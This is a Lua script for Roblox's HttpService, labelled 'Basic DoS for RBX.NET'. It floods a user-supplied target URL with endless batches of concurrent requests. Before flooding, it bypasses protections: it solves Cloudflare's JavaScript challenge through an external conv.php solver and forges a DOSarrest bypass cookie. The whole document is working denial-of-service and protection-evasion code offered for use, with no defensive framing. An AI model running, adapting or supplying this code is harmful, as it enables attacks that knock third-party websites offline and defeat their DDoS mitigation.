-- Basic DoS for RBX.NET
-- 

--          v This is where you put your target URL
targetUrl = "https://INSERT URL HERE/"

-- #{rnd} = math.random()

--        v This is where you put your conv.php URL (if you have one)
convUrl = ""


loopRate = 2
requestRate = 100

targetReq = {
	Method = "GET",
	Url = targetUrl
}

HttpService = game:GetService("HttpService")
serverIp = HttpService:JSONDecode(HttpService:GetAsync("https://api.ipify.org?format=json"))["ip"]

-- DOSarrest functions
function dosArrestCookie()
	return "YPF8827340282Jdskjhfiw_928937459182JAX666="..serverIp
end

-- Cloudflare functions
function solve_challenge(body, domain)
	body = body:match("(try{return !!window.addEventListener}.-setTimeout.-s,t,o,p,b,r,e,a,k,i,n,g,f.-</script>)")
	resp = HttpService:RequestAsync({
		Method = "POST",
		Url = convUrl,
		Body = "body="..HttpService:UrlEncode(body).."&domain="..HttpService:UrlEncode(domain)
	})
	return resp["Body"]:gsub("\n", "")
end
function cf_solve_challenge(resp, url)
	delay = 8
	wait(delay)

	body = resp["Body"]
	domain = url:match("^%w+://([^/]+)")
	submit_url = "https://"..domain.."/cdn-cgi/l/chk_jschl"

	params = {}
	params["jschl_vc"] = body:match('name="jschl_vc" value="(.-)"')
	params["pass"] = body:match('name="pass" value="(.-)"')
	params["jschl_answer"] = solve_challenge(body, domain)

	submit = HttpService:RequestAsync({
		Method = "GET",
		Url = submit_url.."?".. "jschl_vc="..params["jschl_vc"].."&pass="..params["pass"].."&jschl_answer="..params["jschl_answer"]
	})


	if submit["Headers"]["set-cookie"] == nil then
		warn("Cloudflare test failed, trying again")
		testReq = HttpService:RequestAsync(targetReq)
		return cf_solve_challenge(testReq, url)
	else
		warn("Cloudflare test solved")
	end
end

-- Functions
function shallowCopy(original)
    local copy = {}
    for key, value in pairs(original) do
        copy[key] = value
    end
    return copy
end

testReq = HttpService:RequestAsync(targetReq)
siteServer = testReq["Headers"]["server"] or testReq["Headers"]["Server"] or "?"

if testReq["StatusCode"] == 503 and string.find(siteServer, "cloudflare") and string.find(testReq["Body"], "jschl_vc") and string.find(testReq["Body"], "jschl_answer") then
	warn("Cloudflare detected")
	if convUrl ~= nil and convUrl ~= "" then
		cf_solve_challenge(testReq, targetUrl)
	else
		warn("No convUrl found")
	end
elseif siteServer == "DOSarrest" then
	warn("DOSarrest detected")
	if targetReq["Headers"] == nil then
		targetReq["Headers"] = {}
	end
	if targetReq["Headers"]["Cookie"] == nil then
		targetReq["Headers"]["Cookie"] = ""
	end
	targetReq["Headers"]["Cookie"] = targetReq["Headers"]["Cookie"] .. dosArrestCookie().."; "
	warn("DOSarrest test solved")
else
	warn("No protection detected")
end


while wait(LoopRate) do
	for i = 1, requestRate do
		spawn(function()
			success, msg = pcall(function()
				local targetReqx = shallowCopy(targetReq)
				targetReqx["Url"] = targetReqx["Url"]:gsub("#{rnd}", tostring(math.random()))
				req = HttpService:RequestAsync(targetReqx)
				print(i, "->", #req["Body"])
			end)
			if success ~= true then
				warn(msg)
			end
		end)
	end
end
